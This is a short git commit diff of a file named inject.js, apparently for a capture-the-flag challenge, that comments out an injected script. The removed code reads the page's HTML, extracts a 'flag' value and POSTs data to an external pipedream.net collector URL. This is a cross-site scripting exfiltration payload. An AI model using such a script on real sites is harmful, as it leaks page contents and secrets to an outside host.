3e3c3898dc8ab11d2b75b0842acca8a3d98854de
xsxsz <dilemma@mail.dlut.edu.cn>
2024-03-12 16:32:54 -0400

    update

--- inject.js
+++ inject.js
@@ -1,16 +1,17 @@
-body_text = document.body.innerHTML;
-flag = body_text.slice(body_text.lastIndexOf('>') + 1);
+console.log('test')
+// body_text = document.body.innerHTML;
+// flag = body_text.slice(body_text.lastIndexOf('>') + 1);
 
-const headers = new Headers()
-headers.append("Content-Type", "application/json")
+// const headers = new Headers()
+// headers.append("Content-Type", "application/json")
 
-const body = { "flag": "flag" }
+// const body = { "flag": "flag" }
 
-const options = {
-  method: "POST",
-  headers,
-  mode: "cors",
-  body: JSON.stringify(body),
-}
+// const options = {
+//   method: "POST",
+//   headers,
+//   mode: "cors",
+//   body: JSON.stringify(body),
+// }
 
-fetch("https://enp5jg92ceyd.x.pipedream.net/", options)
+// fetch("https://enp5jg92ceyd.x.pipedream.net/", options)
